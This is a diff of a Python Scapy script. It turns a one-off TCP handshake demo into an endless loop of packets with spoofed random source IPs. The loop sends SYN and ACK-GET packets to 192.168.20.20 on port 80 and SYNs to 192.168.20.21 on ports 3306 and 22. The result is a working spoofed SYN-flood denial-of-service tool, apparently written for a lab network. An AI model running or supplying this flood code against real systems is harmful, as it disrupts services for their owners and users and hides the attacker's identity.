@@ -13,37 +13,47 @@ from scapy.all import *
  
 # GET String
 getStr = "GET / HTTP/1.0\r\nHOST: www.google.com\r\n\r\n"
+while True:
+	# Set up target IP
+	
+	 
+	# Generate random source port number
+	port=RandNum(1024,65535)
+	rnd_src_ip = "" + str(RandNum(0, 255)) + "." + str(RandNum(0, 255)) + "." + str(RandNum(0, 255)) + "." + str(RandNum(0, 255)) 
 
-# Set up target IP
-ip=IP(dst="www.google.com")
- 
-# Generate random source port number
-port=RandNum(1024,65535)
- 
-# Create SYN packet
-SYN=ip/TCP(sport=port, dport=80, flags="S", seq=42)
- 
-# Send SYN and receive SYN,ACK
-print "\n[*] Sending SYN packet"
-SYNACK=sr1(SYN)
-print "\n[*] Receiving SYN,ACK packet"
- 
-# Create ACK packet
-ACK=ip/TCP(sport=SYNACK.dport, dport=80, flags="A", seq=SYNACK.ack, ack=SYNACK.seq + 1) / getStr
- 
-# SEND our ACK packet
-print "\n[*] Sending ACK-GET packet"
-error,reply = sr(ACK, multi=1, timeout=1)
+	ip=IP(src=rnd_src_ip, dst="192.168.20.20")
 
-print "Reply from server: \n"
-for r in reply:
-  print r.show()
- 
-print "\n[*] Done!"
+	# Create SYN packet
+	SYN=ip/TCP(sport=port, dport=80, flags="S", seq=0)
+	 
+	# Send SYN and receive SYN,ACK
+	print "\n[*] Sending SYN packet"
+	SYNACK=sr1(SYN, timeout = 0.25)
+	print "\n[*] Receiving SYN,ACK packet"
+	 
+	# Create ACK packet
+	ACK=ip/TCP(sport=port, dport=80, flags="A", seq=1, ack=1) / getStr
+	 
+	# SEND our ACK packet
+	print "\n[*] Sending ACK-GET packet"
+	error,reply = sr(ACK, timeout=0.25)
+
+	print "Reply from server: \n"
+	for r in reply:
+	  print r.show()
+	 
+	print "\n[*] Done!"
 
 
+	# Generate random IP and send SYN packets to 80, 3306, and 22
+	rnd_src_ip = "" + str(RandNum(0, 255)) + "." + str(RandNum(0, 255)) + "." + str(RandNum(0, 255)) + "." + str(RandNum(0, 255))
+	res, unans = sr( IP(src= rnd_src_ip, dst='192.168.20.20')/TCP(flags='S', dport=(80)), timeout = 0.25)
+	rnd_src_ip = "" + str(RandNum(0, 255)) + "." + str(RandNum(0, 255)) + "." + str(RandNum(0, 255)) + "." + str(RandNum(0, 255))
+	res, unans = sr( IP(src= rnd_src_ip, dst='192.168.20.21')/TCP(flags='S', dport=(3306)), timeout = 0.25)
+	rnd_src_ip = "" + str(RandNum(0, 255)) + "." + str(RandNum(0, 255)) + "." + str(RandNum(0, 255)) + "." + str(RandNum(0, 255))
+	res, unans = sr( IP(src= rnd_src_ip, dst='192.168.20.21')/TCP(flags='S', dport=(22)), timeout = 0.25)
 
-
+	print res.summary()
 
 
 
